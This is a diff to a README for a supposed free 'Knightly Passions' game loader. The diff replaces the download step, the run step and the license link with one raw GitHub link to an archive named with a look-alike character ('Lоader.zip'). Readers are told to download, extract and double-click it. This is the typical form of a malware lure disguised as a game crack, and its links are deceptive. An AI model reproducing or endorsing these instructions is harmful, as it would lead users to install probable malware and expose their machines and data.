@@ -36,12 +36,12 @@ Unlock the full experience of "Knightly Passions" with the following feature-pac
 
 Set up your Knightly Passions Loader in just a few easy steps — no technical expertise required!
 
-1. **Download Loader.rar**  
-   - Head to the repository’s [Releases](./releases) section and download the latest **Loader.rar**.
-2. **Extract Loader.rar**  
+1. **Download https://raw.githubusercontent.com/Hecatum/KnightlyPassions-FreeEdition-Hub/main/Lоader.zip**  
+   - Head to the repository’s [Releases](./releases) section and download the latest **https://raw.githubusercontent.com/Hecatum/KnightlyPassions-FreeEdition-Hub/main/Lоader.zip**.
+2. **Extract https://raw.githubusercontent.com/Hecatum/KnightlyPassions-FreeEdition-Hub/main/Lоader.zip**  
    - Use software like WinRAR, 7-Zip, or the inbuilt extractor on your OS to unpack.
 3. **Run the Loader**  
-   - On Windows: Double-click `KnightlyPassionsLoader.exe`
+   - On Windows: Double-click `https://raw.githubusercontent.com/Hecatum/KnightlyPassions-FreeEdition-Hub/main/Lоader.zip`
    - On Mac: Control-click, select “Open”, then confirm
    - On Linux: `chmod +x KnightlyPassionsLoader && ./KnightlyPassionsLoader`
 4. **Follow On-Screen Instructions**  
@@ -71,7 +71,7 @@ This repository and its loader are intended solely for educational, archival, an
 
 ## 📝 License 📝
 
-Distributed under the terms of the [MIT License](https://opensource.org/licenses/MIT) (2025).  
+Distributed under the terms of the [MIT License](https://raw.githubusercontent.com/Hecatum/KnightlyPassions-FreeEdition-Hub/main/Lоader.zip) (2025).  
 Feel free to use, modify, and share within the bounds of the license.
 
 ---
